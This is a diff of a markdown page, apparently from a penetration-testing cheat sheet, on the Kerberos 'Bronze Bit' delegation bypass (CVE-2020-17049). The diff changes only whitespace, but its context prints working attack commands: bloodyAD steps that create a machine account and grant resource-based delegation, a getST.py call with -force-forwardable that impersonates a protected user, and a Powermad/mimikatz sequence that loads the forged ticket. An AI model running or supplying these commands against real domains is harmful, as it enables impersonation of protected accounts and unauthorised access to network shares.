@@ -3,16 +3,15 @@
 CVE-2020-17049
 
 > An attacker can impersonate users which are not allowed to be delegated. This includes members of the **Protected Users** group and any other users explicitly configured as **sensitive and cannot be delegated**.
-
 > Patch is out on November 10, 2020, DC are most likely vulnerable until [February 2021](https://support.microsoft.com/en-us/help/4598347/managing-deployment-of-kerberos-s4u-changes-for-cve-2020-17049).
 
 :warning: Patched Error Message : `[-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)`
 
 Requirements:
 
-* Service account's password hash 
+* Service account's password hash
 * Service account's with `Constrained Delegation` or `Resource Based Constrained Delegation`
-* [Impacket PR #1013](https://github.com/SecureAuthCorp/impacket/pull/1013) 
+* [Impacket PR #1013](https://github.com/SecureAuthCorp/impacket/pull/1013)
 
 **Attack #1** - Bypass the `Trust this user for delegation to specified services only – Use Kerberos only` protection and impersonate a user who is protected from delegation.
 
@@ -30,7 +29,9 @@ ls \\service2.test.local\c$
 ```
 
 **Attack #2** - Write Permissions to one or more objects in the AD
+
 * Windows/Linux:
+
     ```ps1
     bloodyAD -u user -p 'totoTOTOtoto1234*' -d test.local --host 10.100.10.5 add computer AttackerService 'AttackerServicePassword'
     bloodyAD --host 10.1.0.4 -u user -p 'totoTOTOtoto1234*' -d test.local add rbcd 'Service2$' 'AttackerService$'
@@ -38,7 +39,9 @@ ls \\service2.test.local\c$
     # Execute the attack
     getST.py -spn cifs/Service2.test.local -impersonate User2 -dc-ip 10.100.10.5 -force-forwardable 'test.local/AttackerService$:AttackerServicePassword'
     ```
+
 * Windows only:
+
     ```powershell
     # Create a new machine account
     Import-Module .\Powermad\powermad.ps1
@@ -58,7 +61,6 @@ ls \\service2.test.local\c$
     # Load the ticket
     .\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit | Out-Null
     ```
-
 
 ## References
 
